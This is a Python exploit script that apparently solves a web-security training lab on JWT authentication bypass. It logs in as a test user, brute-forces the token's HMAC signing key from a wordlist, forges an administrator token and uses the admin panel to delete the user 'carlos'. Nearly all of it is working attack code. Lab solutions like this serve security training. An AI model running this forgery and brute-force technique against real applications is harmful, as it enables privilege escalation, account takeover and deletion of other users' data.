# JWT authentication bypass via weak signing key

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

import base64
import hashlib
import hmac

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to log in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	return r

def sign_jwt(h, b, key):
# removing "=" to avoid Incorrect Padding
	enc_h = base64.urlsafe_b64encode(h.encode()).decode().split('=')[0]
	enc_b = base64.urlsafe_b64encode(b.encode()).decode().split('=')[0]
	params = f'{enc_h}.{enc_b}'.encode()
	sig = hmac.new(key.encode(), params, hashlib.sha256).digest()
	enc_sig = base64.urlsafe_b64encode(sig).decode().split('=')[0]
	return params.decode() + '.' + enc_sig

def check(token, key):
	enc_h, enc_b, sig = token.split('.')
# adding "==" to avoid Incorrect Padding
	h = base64.urlsafe_b64decode(enc_h + '==').decode()
	b = base64.urlsafe_b64decode(enc_b + '==').decode()
	resigned = sign_jwt(h, b, key).split('.')[2]
	if resigned == sig:
		return key
	else:
		return False

def brute_force_jwt(token):
	print('\n[+] Trying to brute-force the JWT to retrieve the key...')
	sys.stdout.write('\r\t')
	length = 0
	with open('./secrets.txt') as fp:
		for i, line in enumerate(fp):
			time.sleep(.001)
			sys.stdout.flush()
			secret = line.strip()[:52]
			if len(secret) > length:
				length = len(secret)
			sys.stdout.write('\rTrying secret:\t%s%s' % (secret, ' ' * (length - len(secret))))
			sys.stdout.flush()
			if check(token, secret):
				sys.stdout.write('\r\n')
				print('[+] Found secret:\t%s ' % secret)
				return secret

def decode_jwt_token(token):
	enc_h, enc_b, sig = token.split('.')
# adding "==" to avoid Incorrect Padding
	h = base64.b64decode(enc_h + '==').decode()
	print('\n - Token Headers:\t%s' % h)
	b = base64.b64decode(enc_b + '==').decode()
	print(' - Token Body:\t\t%s' % b)
	print(' - Token Signature:\t%s' % sig)
	return (h, b, sig)

def encode_jwt_token(h: dict, b: dict, sig: str):
# removing "=" to avoid Incorrect Padding
	enc_h = base64.urlsafe_b64encode(h.encode()).decode().split('=')[0]
	print('\n - Encoded Headers:\t%s' % enc_h)
	enc_b = base64.urlsafe_b64encode(b.encode()).decode().split('=')[0]
	print(' - Encoded Body:\t\t%s' % enc_b)
	print(' - Encoded Signature:\t%s\n' % sig)
	return f'{enc_h}.{enc_b}.{sig}'

def get_jwt_token(s):
	token = s.cookies['session']
	print('\n[+] Found JWT session token:\t%s' % token)
	return token

def delete_carlos(s, url, token):
	print('\n[+] Trying to access to the Admin Panel with the resigned JWT...')
	time.sleep(1)
	cookies = {'session': token}
	r = s.get(url+'/admin', cookies=cookies)
	if '/admin/delete' in r.text:
		print('[+] Trying to delete Carlos account with the resigned JWT...')
		r = s.get(url + '/admin/delete?username=carlos', cookies=cookies)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: JWT authentication bypass via weak signing key')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = connect_as_wiener(s, url)
			time.sleep(2)
			token = get_jwt_token(s)
			print('\n[+] Decoded token values:')
			h, b, sig = decode_jwt_token(token)
			secret = brute_force_jwt(token)
			print('\n[+] Replacing our user by admin and sign the JWT with found secret...\n')
			body = b.replace('"sub":"wiener"', '"sub":"administrator"')
			new_token = sign_jwt(h, body, secret)
			print(new_token)
			print('[+] New token values:')
			decode_jwt_token(new_token)
			delete_carlos(s, url, new_token)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
